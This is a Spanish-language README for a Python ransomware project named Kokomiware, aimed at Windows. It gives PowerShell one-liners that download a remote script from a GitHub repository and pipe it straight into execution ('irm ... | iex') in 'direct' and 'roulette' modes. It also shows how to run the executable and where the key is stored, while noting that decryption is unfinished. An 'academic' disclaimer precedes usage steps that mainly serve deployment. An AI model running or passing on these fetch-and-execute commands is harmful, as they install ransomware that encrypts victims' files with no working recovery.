# Kokomiware 

## ¿Que es?
Kokomiware es un simple ransomware hecho en python.

## Advertencia
Este software esta bajo la licenia GPLV3, bajo ninguna circunstancia deber ser utilizado con malos fines, su proposito es meramente academico, para el estudio y desarrollo de malware. Me deslindo de cualquier mal uso que se le pueda dar.

## Uso

**Kokomiware esta pensado solo para funcionar en sistemas operativos de windows, pero podria adaptarse a sistemas UNIX**<br>
<br>
- One line en powershell para el modo directo
```powershell
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/direct.ps1 | iex
```
- One line en powershell para el modo ruleta
```powershell
irm https://raw.githubusercontent.com/quantumwavves/Kokomi-Russian-Roulette/master/bin/oneline/roulette.ps1 | iex
```

- Uso normal en CLI con el ejectuable.
```powershell
.\kokomiware.exe
```
- Desarrollo<br>

Recomiendo usar un entorno virtual de python

```console
#Instalando dependecias y ejecutando el codigo
$ pip install -r requirements.txt
$ python krr-fernet.py
```
## Desencriptar archivos

Caracteristica en construccion...<br>
Llave en: `$env:temp\snmgy.png`

## Lista de cosas por hacer
- [ ] Optimizar tiempos de ejecucion en python.
- [ ] Crear version para C o C++.
- [ ] Añadir mas funciones de malware.
- [ ] Crear diseño de ejecucion por fases.

## Inspiracion:
- [Sangonomiya Kokomi](https://genshin-impact.fandom.com/wiki/Sangonomiya_Kokomi) (Uno de mis personajes favoritos de Genshin Impact)
